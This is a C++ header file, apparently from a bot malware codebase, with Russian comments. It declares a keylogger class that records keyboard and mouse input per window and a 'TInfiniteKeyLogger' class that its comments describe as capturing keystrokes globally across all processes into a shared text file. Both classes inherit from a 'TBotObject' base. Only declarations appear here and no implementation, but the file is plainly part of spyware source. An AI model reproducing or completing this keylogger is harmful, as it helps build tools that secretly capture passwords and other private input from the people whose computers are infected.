//---------------------------------------------------------------------------

#ifndef KeyLoggerH
#define KeyLoggerH
//---------------------------------------------------------------------------

#include <Windows.h>

#include "GetApi.h"
#include "Strings.h"



//********************************************************
//   TKeyLogger - Базовый класс келогера
//********************************************************
class TKeyLogger : public TBotObject
{
public:
	TKeyLogger();
	virtual ~TKeyLogger();

	// Функция записывает лог от клавиатуры
	bool WriteKeyboard(HWND Wnd, const char* Text);

	// функция записывает лог от мыши
	bool WriteMouse(HWND Wnd, int X, int Y, int Button);


};




//********************************************************
//  TInfiniteKeyLogger - класс бесконечного логирования
//                       ввода с клавиатуры. Класс дейст-
//  твует глобально на все процессы. Данные пишутся в
//  общий текстовый файл.
//
//********************************************************

class TInfiniteKeyLogger : public TBotObject
{
private:
	string FSignalFile;
	string FDataFile;

	string static GetSignalFileName();
public:
	TInfiniteKeyLogger();
	~TInfiniteKeyLogger();

	//--------------------------------------------
	//  Activate - Функция активирует глобальный
	//             кейлогер
	//--------------------------------------------
	bool static Activate();

	//--------------------------------------------
	//  Activated - Функция возвращает истину если
	//             кейлогер активирован
	//--------------------------------------------
	bool static Activated();
};


//---------------------------------------------------------------------------
#endif
